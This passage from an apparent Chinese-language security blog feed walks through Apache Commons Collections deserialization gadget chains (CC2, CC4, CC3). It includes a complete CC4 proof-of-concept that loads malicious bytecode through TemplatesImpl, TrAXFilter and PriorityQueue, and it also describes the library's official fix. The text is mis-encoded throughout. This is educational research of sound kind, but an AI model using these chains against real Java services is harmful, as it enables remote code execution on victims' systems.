class="string">&quot;transformer&quot;</span>, invokeTransformer);</span><br><span class="line"></span><br><span class="line">serialize(queue);</span><br><span class="line">unserialize();</span><br></pre></td></tr></table></figure><h3 id="2-æ€»ç»“"><a href="#2-æ€»ç»“" class="headerlink" title="2.æ€»ç»“"></a>2.æ€»ç»“</h3><p>CC2 é“¾åŒºåˆ«ä¸å…¶ä»–é“¾å­ä¸€ç‚¹çš„åŒºåˆ«åœ¨äºæ²¡æœ‰ç”¨ <code>Transformer</code> æ•°ç»„ï¼Œä¸ç”¨æ•°ç»„æ˜¯å› ä¸ºæ¯”å¦‚ shiro å½“ä¸­çš„æ¼æ´ï¼Œå®ƒä¼šé‡å†™å¾ˆå¤šåŠ¨æ€åŠ è½½æ•°ç»„çš„æ–¹æ³•ï¼Œè¿™å°±å¯èƒ½ä¼šå¯¼è‡´æˆ‘ä»¬çš„ EXP æ— æ³•é€šè¿‡æ•°ç»„å®ç°</p><p>**commons-collections4 **å…¶å®ä¾æ—§å¯ä»¥ä½¿ç”¨ <code>CC6</code>ï¼Œåªæ˜¯å…¶ä¸­çš„<code>LazyMap#decorate</code>éœ€è¦é€‚åº”ä¸€ä¸‹</p><h3 id="3-å®˜æ–¹ä¿®å¤"><a href="#3-å®˜æ–¹ä¿®å¤" class="headerlink" title="3.å®˜æ–¹ä¿®å¤"></a>3.å®˜æ–¹ä¿®å¤</h3><p>Apache å®˜æ–¹å¹¶æ²¡æœ‰ä¿®æ”¹ <code>InvokerTransformer</code> å†…éƒ¨æ‰§è¡Œä»£ç çš„é€»è¾‘ï¼ˆå› ä¸ºå®ƒæœ¬èº«çš„åŠŸèƒ½æ˜¯åˆæ³•çš„ï¼‰ï¼Œè€Œæ˜¯ç»™è¿™äº›å±é™©ç±»åŠ äº†ä¸€æŠŠ**â€œé”â€ï¼Œåªæœ‰åœ¨æ˜¾å¼å…è®¸çš„æƒ…å†µä¸‹ï¼Œæ‰å…è®¸å®ƒä»¬å‚ä¸åºåˆ—åŒ–æˆ–ååºåˆ—åŒ–è¿‡ç¨‹**</p><p>åœ¨ä¿®å¤ç‰ˆæœ¬ä¸­ï¼Œå®˜æ–¹ä¿®æ”¹äº†æ‰€æœ‰æ¶‰åŠæ¼æ´çš„ç±»ï¼ˆä¸»è¦æ˜¯ <code>Transformer</code> çš„å®ç°ç±»ï¼‰ã€‚</p><p>ä»¥æœ€æ ¸å¿ƒçš„ <strong><code>InvokerTransformer</code></strong> ä¸ºä¾‹ï¼Œå®˜æ–¹åœ¨å…¶ä¸­å¼ºåˆ¶é‡å†™äº† Java åºåˆ—åŒ–çš„ä¸¤ä¸ªæ ‡å‡†æ–¹æ³•ï¼š<code>writeObject</code>ï¼ˆåºåˆ—åŒ–æ—¶è°ƒç”¨ï¼‰å’Œ <code>readObject</code>ï¼ˆååºåˆ—åŒ–æ—¶è°ƒç”¨ï¼‰ã€‚</p><p><strong>ä¿®å¤åçš„ä»£ç é€»è¾‘ç¤ºæ„ï¼ˆç®€åŒ–ç‰ˆï¼‰ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public class InvokerTransformer implements Transformer, Serializable &#123;</span><br><span class="line">    </span><br><span class="line">    // ... åŸæœ‰é€»è¾‘ä¸å˜ ...</span><br><span class="line"></span><br><span class="line">    // ã€æ–°å¢ã€‘åºåˆ—åŒ–å†™å…¥æ—¶çš„æ£€æŸ¥</span><br><span class="line">    private void writeObject(ObjectOutputStream os) throws IOException &#123;</span><br><span class="line">        // 1. å‘¼å«çœ‹é—¨äººï¼šæ£€æŸ¥æ˜¯å¦å…è®¸åºåˆ—åŒ–ï¼Ÿ</span><br><span class="line">        FunctorUtils.checkUnsafeSerialization(InvokerTransformer.class);</span><br><span class="line">        // 2. å¦‚æœé€šè¿‡ï¼Œæ‰æ‰§è¡Œæ­£å¸¸çš„åºåˆ—åŒ–</span><br><span class="line">        os.defaultWriteObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // ã€æ–°å¢ã€‘ååºåˆ—åŒ–è¯»å–æ—¶çš„æ£€æŸ¥</span><br><span class="line">    private void readObject(ObjectInputStream is) throws ClassNotFoundException, IOException &#123;</span><br><span class="line">        // 1. å‘¼å«çœ‹é—¨äººï¼šæ£€æŸ¥æ˜¯å¦å…è®¸ååºåˆ—åŒ–ï¼Ÿ</span><br><span class="line">        FunctorUtils.checkUnsafeSerialization(InvokerTransformer.class);</span><br><span class="line">        // 2. å¦‚æœé€šè¿‡ï¼Œæ‰æ‰§è¡Œæ­£å¸¸çš„ååºåˆ—åŒ–æ¢å¤å¯¹è±¡</span><br><span class="line">        is.defaultReadObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>FunctorUtils.checkUnsafeSerialization</code> æ˜¯ 3.2.2&#x2F;4.1 æ–°å¢çš„ä¸€ä¸ªé™æ€æ£€æŸ¥æ–¹æ³•ã€‚å®ƒçš„é€»è¾‘éå¸¸ç®€å•ç²—æš´ï¼š</p><ol><li>å®ƒä¼šè¯»å–ä¸€ä¸ªç‰¹å®šçš„ç³»ç»Ÿå±æ€§ï¼š<code>org.apache.commons.collections.enableUnsafeSerialization</code>ã€‚</li><li><strong>å¦‚æœè¯¥å±æ€§æ²¡æœ‰è¢«è®¾ç½®ä¸º <code>true</code></strong>ï¼ˆé»˜è®¤æƒ…å†µå°±æ˜¯ nullï¼‰ï¼Œå®ƒä¼šç›´æ¥æŠ›å‡º <code>UnsupportedOperationException</code> å¼‚å¸¸ã€‚</li><li>ä¸€æ—¦æŠ›å‡ºå¼‚å¸¸ï¼Œæ•´ä¸ªååºåˆ—åŒ–è¿‡ç¨‹ç¬é—´ç»ˆæ­¢ï¼Œæ”»å‡»é“¾è¢«åˆ‡æ–­ï¼ŒRCEï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼‰ä¹Ÿå°±æ— æ³•å‘ç”Ÿäº†ã€‚</li></ol><p><strong>æºç é€»è¾‘ç‰‡æ®µï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">static void checkUnsafeSerialization(Class&lt;?&gt; clazz) &#123;</span><br><span class="line">    // è·å–ç³»ç»Ÿå±æ€§</span><br><span class="line">    String unsafeSerializationProperty = System.getProperty(&quot;org.apache.commons.collections.enableUnsafeSerialization&quot;);</span><br><span class="line">    </span><br><span class="line">    // å¦‚æœæ²¡æœ‰æ˜¾å¼å¼€å¯</span><br><span class="line">    if (!&quot;true&quot;.equalsIgnoreCase(unsafeSerializationProperty)) &#123;</span><br><span class="line">        // ç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œä¸­æ–­æµç¨‹</span><br><span class="line">        throw new UnsupportedOperationException(</span><br><span class="line">            &quot;Serialization support for &quot; + clazz.getName() + &quot; is disabled for security reasons. &quot; +</span><br><span class="line">            &quot;To enable it set system property &#x27;org.apache.commons.collections.enableUnsafeSerialization&#x27; to &#x27;true&#x27;, &quot; +</span><br><span class="line">            &quot;but you must ensure that your application does not de-serialize objects from untrusted sources.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸ä»…æ˜¯ <code>InvokerTransformer</code>ï¼Œæ‰€æœ‰å¯èƒ½è¢«ç”¨äºæ„å»ºæ¶æ„è°ƒç”¨é“¾çš„ç±»éƒ½åŠ ä¸Šäº†è¿™ä¸ªâ€œé”â€ï¼š</p><ul><li><code>org.apache.commons.collections.functors.InvokerTransformer</code></li><li><code>org.apache.commons.collections.functors.InstantiateTransformer</code></li><li><code>org.apache.commons.collections.functors.CloneTransformer</code></li><li><code>org.apache.commons.collections.functors.PrototypeFactory</code></li><li><code>org.apache.commons.collections.functors.WhileClosure</code> (4.1ç‰ˆæœ¬)</li><li><code>org.apache.commons.collections.functors.ForClosure</code> (3.2.2ç‰ˆæœ¬)</li></ul>]]></content>
      
      
      <categories>
          
          <category> CCé“¾ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javaå®‰å…¨ </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> CCé“¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaå®‰å…¨-CC4</title>
      <link href="/2026/01/28/CC4-Gadget/"/>
      <url>/2026/01/28/CC4-Gadget/</url>
      
        <content type="html"><![CDATA[<h1 id="javaå®‰å…¨-CC4"><a href="#javaå®‰å…¨-CC4" class="headerlink" title="javaå®‰å…¨-CC4"></a>javaå®‰å…¨-CC4</h1><ul><li><p><strong>ç¯å¢ƒ</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">oracle_jdk8u65</span><br><span class="line">https:<span class="comment">//www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</span></span><br><span class="line"></span><br><span class="line">open_jdk8u65</span><br><span class="line">https:<span class="comment">//hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4</span></span><br><span class="line">https:<span class="comment">//github.com/openjdk/jdk8u/releases/tag/jdk8u71-b15</span></span><br><span class="line">jdk-af660750b2f4\src\share\classes\sun</span><br><span class="line"></span><br><span class="line">maven_3<span class="number">.6</span><span class="number">.3</span></span><br><span class="line">https:<span class="comment">//archive.apache.org/dist/maven/maven-3/3.6.3/binaries/</span></span><br><span class="line">æ•™ç¨‹:https:<span class="comment">//blog.csdn.net/MSDCP/article/details/127680844</span></span><br><span class="line"></span><br><span class="line">commons-collections4<span class="number">.0</span></span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">4.0</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p><strong>CC4 ç»•è¿‡çš„æ˜¯Commons collections3 çš„é˜²æŠ¤ï¼ŒåŒæ—¶ä¹Ÿåªé€‚ç”¨äº Commons collections4 ç‰ˆæœ¬</strong></p></li></ul><h2 id="ä¸€ã€ä¸»è¦é“¾è·¯é€»è¾‘"><a href="#ä¸€ã€ä¸»è¦é“¾è·¯é€»è¾‘" class="headerlink" title="ä¸€ã€ä¸»è¦é“¾è·¯é€»è¾‘"></a>ä¸€ã€ä¸»è¦é“¾è·¯é€»è¾‘</h2><p><strong>CC4 ä¸»è¦æ˜¯å¯¹å…¥å£ç‚¹ä»¥åŠ transformer è°ƒç”¨ä¸Šåšå‡ºäº†æ”¹å˜ï¼Œä¹Ÿå°±æ˜¯ååºåˆ—åŒ–çš„å¯¹è±¡</strong></p><h3 id="1-transformer-å‡ºå£"><a href="#1-transformer-å‡ºå£" class="headerlink" title="1.transformer å‡ºå£"></a>1.<code>transformer </code>å‡ºå£</h3><p><code>TransformingComparator</code> çš„<code>compare</code>æ–¹æ³•è°ƒç”¨äº†<code>transformer</code>æ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601252117067.png" alt="image-20260125211726606"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br></pre></td></tr></table></figure><h3 id="2-readObjectå…¥å£"><a href="#2-readObjectå…¥å£" class="headerlink" title="2.readObjectå…¥å£"></a>2.<code>readObject</code>å…¥å£</h3><ul><li><p><code>PriorityQueue#readObject</code></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601252121240.png" alt="image-20260125212114072"></p><p>è¿™ä¸ªç±»ä¸­è°ƒç”¨äº†<code>heapify</code>æ–¹æ³•</p></li><li><p><code>PriorityQueue#heapify</code></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601252122042.png" alt="image-20260125212216922"></p><p><code>PriorityQueue#siftDown</code></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601252123797.png" alt="image-20260125212323743"></p><p>åˆè°ƒç”¨äº†<code>siftDownUsingComparator</code>æ–¹æ³•</p></li><li><p><code>PriorityQueue#siftDownUsingComparator</code></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601252124483.png" alt="image-20260125212419319"></p><p><strong>å°±åœ¨è¿™é‡Œï¼Œè°ƒç”¨äº†æˆ‘ä»¬æœ€æƒ³çœ‹åˆ°çš„ compare æ–¹æ³•</strong></p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(comparator);</span><br></pre></td></tr></table></figure><h2 id="äºŒã€poc"><a href="#äºŒã€poc" class="headerlink" title="äºŒã€poc"></a>äºŒã€poc</h2><h3 id="1-éœ€è¦è§£å†³çš„æ¡ä»¶"><a href="#1-éœ€è¦è§£å†³çš„æ¡ä»¶" class="headerlink" title="1.éœ€è¦è§£å†³çš„æ¡ä»¶"></a>1.éœ€è¦è§£å†³çš„æ¡ä»¶</h3><p><code>PriorityQueue#heapify</code></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601252239877.png" alt="image-20260125212216922"></p><p>è¿™ä¸ªæ–¹æ³•ä¸­åˆè¿›ä¸€æ­¥è°ƒç”¨äº†<code>siftDown</code>æ–¹æ³•</p><p><strong>ä½†æ˜¯è¿™é‡Œæœ‰ä¸€ä¸ªæ¡ä»¶éœ€è¦æ»¡è¶³</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">    siftDown(i, (E) queue[i]);</span><br></pre></td></tr></table></figure><p>æƒ³è¦è¿è¡Œæˆ‘ä»¬æ¥ä¸‹æ¥çš„<code>siftDown</code>å‡½æ•°ï¼Œå¿…é¡»è¦ä½¿å¾—<code>size</code>å¤§äº2æ‰å¯ä»¥è¿›è¡Œä¸€æ¬¡å¾ªç¯</p><p><code>(size &gt;&gt;&gt; 1) - 1</code> æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ</p><ul><li><strong><code>size</code></strong>: é˜Ÿåˆ—ä¸­å…ƒç´ çš„æ€»ä¸ªæ•°ã€‚</li><li><strong><code>&gt;&gt;&gt; 1</code></strong>: æ— ç¬¦å·å³ç§» 1 ä½ï¼Œåœ¨æ•°å­¦ä¸Šç­‰åŒäº <strong>é™¤ä»¥ 2</strong>ã€‚</li><li><strong><code>- 1</code></strong>: å› ä¸ºæ•°ç»„ä¸‹æ ‡æ˜¯ä» 0 å¼€å§‹çš„ã€‚</li></ul><p>æ‰€ä»¥<code>size</code>éœ€è¦å¤§äºç­‰äº2</p><p>é€šè¿‡è‡ªå¸¦çš„<code>add</code>æ–¹æ³•å¢åŠ <code>size</code>å¤§å°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p><strong>ä½†æ˜¯ï¼Œç¬¬äºŒæ¬¡ <code>add(1)</code>:</strong></p><ul><li>é˜Ÿåˆ—é‡Œå·²ç»æœ‰ä¸€ä¸ªå…ƒç´ äº†ã€‚</li><li>æ–°å…ƒç´ æ”¾å…¥æ•°ç»„æœ«å°¾ï¼Œç„¶åè°ƒç”¨ <strong><code>siftUp</code>ï¼ˆä¸Šæµ®ï¼‰</strong> æ¥ç»´æŒå †çš„æ€§è´¨ã€‚</li><li><strong><code>siftUp</code> ä¼šè°ƒç”¨ <code>comparator.compare()</code> æ¥æ¯”è¾ƒæ–°å…ƒç´ å’Œçˆ¶èŠ‚ç‚¹ï¼</strong></li></ul><p><strong>åæœï¼š</strong> å¦‚æœåœ¨ <code>new PriorityQueue</code> æ—¶ä¼ å…¥çš„æ˜¯å·²ç»é…ç½®å¥½ <code>Runtime.exec</code> çš„æ¶æ„ <code>comparator</code>ï¼Œé‚£ä¹ˆåœ¨ä½ å†™ Payload ä»£ç è¿è¡Œåˆ°ç¬¬äºŒè¡Œ <code>add</code> çš„æ—¶å€™ï¼Œå°±ä¼šå¼¹å‡ºè®¡ç®—å™¨ï¼Œè€Œä¸æ˜¯ç”Ÿæˆ Payload æ–‡ä»¶</p><p>å› æ­¤ï¼Œæˆ‘ä»¬é€šè¿‡åå°„ä¿®æ”¹ï¼Œé˜²æ­¢<strong>èµ°ç«</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] chuan0000 = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(chuan0000);</span><br><span class="line"></span><br><span class="line"><span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line">PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(comparator);</span><br><span class="line"><span class="comment">//æ·»åŠ ä¸¤ä¸ªå…ƒç´ </span></span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">setFieldValue(chainedTransformer, <span class="string">&quot;iTransformers&quot;</span>, chuan);</span><br></pre></td></tr></table></figure><h3 id="2-å®Œæ•´"><a href="#2-å®Œæ•´" class="headerlink" title="2.å®Œæ•´"></a>2.å®Œæ•´</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\å°å·\\code\\javasec\\CC1\\target\\classes\\CC1\\HelloTranslet.class&quot;</span>));</span><br><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="comment">//åå°„ä¿®æ”¹å†…éƒ¨å±æ€§</span></span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj&#125;);</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class);</span><br><span class="line"></span><br><span class="line">Transformer[] chuan = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;constantTransformer, instantiateTransformer&#125;;</span><br><span class="line"></span><br><span class="line">Transformer[] chuan0000 = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(chuan0000);</span><br><span class="line"></span><br><span class="line"><span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line">PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(comparator);</span><br><span class="line"><span class="comment">//æ·»åŠ ä¸¤ä¸ªå…ƒç´ </span></span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">setFieldValue(chainedTransformer, <span class="string">&quot;iTransformers&quot;</span>, chuan);</span><br><span class="line"></span><br><span class="line">serialize(queue);</span><br><span class="line">unserialize();</span><br></pre></td></tr></table></figure><h3 id="3-ç‰ˆæœ¬é—®é¢˜"><a href="#3-ç‰ˆæœ¬é—®é¢˜" class="headerlink" title="3.ç‰ˆæœ¬é—®é¢˜"></a>3.ç‰ˆæœ¬é—®é¢˜</h3><p><strong>commos collections3 ä¸èƒ½ä½¿ç”¨çš„ä¸»è¦åŸå› æ˜¯åªæœ‰4çš„</strong><code>TransformingComparator</code><strong>å®ç°äº†åºåˆ—åŒ–æ¥å£</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601252149393.png" alt="image-20260125214902242"></p><p><strong>commos collections èº«ä¸–é—®é¢˜</strong></p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601252255165.png" alt="image-20260125225503009" style="zoom: 80%;" /><h3 id="4-æ€»ç»“"><a href="#4-æ€»ç»“" class="headerlink" title="4.æ€»ç»“"></a>4.æ€»ç»“</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">PriorityQueue#</span><span class="language-bash">readObject</span></span><br><span class="line"><span class="meta prompt_">PriorityQueue#</span><span class="language-bash">heapify</span></span><br><span class="line"><span class="meta prompt_">PriorityQueue#</span><span class="language-bash">siftDown</span></span><br><span class="line"><span class="meta prompt_">PriorityQueue#</span><span class="language-bash">siftDownUsingComparator</span></span><br><span class="line">TransformingComparator#compare</span><br><span class="line"></span><br><span class="line">CC3éƒ¨åˆ†</span><br><span class="line"><span class="meta prompt_">ChainedTransformer#</span><span class="language-bash">transform</span></span><br><span class="line"><span class="meta prompt_">InstantiateTransformer#</span><span class="language-bash">transform</span></span><br><span class="line"><span class="meta prompt_">TrAXFilter#</span><span class="language-bash">getConstructor</span></span><br><span class="line"><span class="meta prompt_">TemplatesImpl#</span><span class="language-bash">newTransformer</span></span><br><span class="line"><span class="meta prompt_">TemplatesImpl#</span><span class="language-bash">getTransletInstance</span></span><br><span class="line"><span class="meta prompt_">TemplatesImpl#</span><span class="language-bash">defineTransletClasses</span></span><br><span class="line"><span class="meta prompt_">TemplatesImpl#</span><span class="language-bash">defineClass</span></span><br><span class="line">åŠ è½½æ¶æ„å­—èŠ‚ç </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CCé“¾ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javaå®‰å…¨ </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> CCé“¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaå®‰å…¨-CC3</title>
      <link href="/2026/01/28/CC3-Gadget/"/>
      <url>/2026/01/28/CC3-Gadget/</url>
      
        <content type="html"><![CDATA[<h1 id="Javaå®‰å…¨-CC3"><a href="#Javaå®‰å…¨-CC3" class="headerlink" title="Javaå®‰å…¨-CC3"></a>Javaå®‰å…¨-CC3</h1><p><code>CC3</code> çš„ç›®çš„æ˜¯ä¸ºäº†æ‰¾åˆ°é™¤<code>invokeTransformer</code>ä¸<code>Runtime#exec</code>ä¹‹å¤–çš„å¯ä»¥å®ç°å‘½ä»¤æ‰§è¡Œçš„<strong>æ¼æ´ç‚¹</strong></p><p><strong>å³</strong></p><p><code>TemplatesImpl#newTransformer</code>ä¸<code>TrAXFilter#TrAXFilter</code></p><h2 id="ä¸€ã€ä¸»è¦é€»è¾‘"><a href="#ä¸€ã€ä¸»è¦é€»è¾‘" class="headerlink" title="ä¸€ã€ä¸»è¦é€»è¾‘"></a>ä¸€ã€ä¸»è¦é€»è¾‘</h2><h3 id="1-å±é™©è°ƒç”¨ç‚¹"><a href="#1-å±é™©è°ƒç”¨ç‚¹" class="headerlink" title="1.å±é™©è°ƒç”¨ç‚¹"></a>1.å±é™©è°ƒç”¨ç‚¹</h3><p>è¿™é‡Œç”¨åˆ°äº†ä¹‹å‰æ‰€å­¦çš„åŠ¨æ€ç±»åŠ è½½æ–¹æ³•<code>defineClass</code>ï¼Œä½†æ˜¯å¤§éƒ¨åˆ†ç›´æ¥å®ç°çš„<code>defineClass</code>æ–¹æ³•éƒ½<strong>ç§æœ‰çš„</strong></p><p>ç»è¿‡å¯»æ‰¾ï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†<code>TemplatesImpl</code></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601241714703.png" alt="image-20260124171321899"></p><p><strong>äºæ˜¯å¯ä»¥ä½¿ç”¨ä»–çš„ä¸€ç³»åˆ—é€»è¾‘åŠ è½½æˆ‘ä»¬çš„æ¶æ„å¤–éƒ¨ç±»</strong></p><h3 id="2-TemplatesImpl-newTransformer"><a href="#2-TemplatesImpl-newTransformer" class="headerlink" title="2.TemplatesImpl#newTransformer"></a>2.<code>TemplatesImpl#newTransformer</code></h3><p>å°è¯•ä½¿ç”¨ä¸€ä¸ªå…¬æœ‰æ–¹æ³•è°ƒç”¨<code>defineClass</code></p><p><code>defineTransletClasses</code>è¿™ä¸ªæ–¹æ³•è°ƒç”¨äº†<code>defineClass</code></p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601241720616.png" alt="image-20260124172036610"></p><p>å°†å…¶åŠ è½½å‚æ•°æ”¹ä¸ºæ¶æ„ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\å°å·\\code\\javasec\\CC1\\target\\classes\\CC1\\HelloTranslet.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br></pre></td></tr></table></figure><p>æ­¤æ–¹æ³•ä¾æ—§ä¸º<code>private</code>ï¼Œåˆæ‰¾åˆ°<code>getTransletInstance</code>æ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601241727821.png" alt="image-20260124172537360"></p><p>ä½†æ˜¯éœ€è¦æ»¡è¶³å›¾ä¸­çš„æ¡ä»¶ï¼Œé€šè¿‡åå°„è®¾ç½®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span 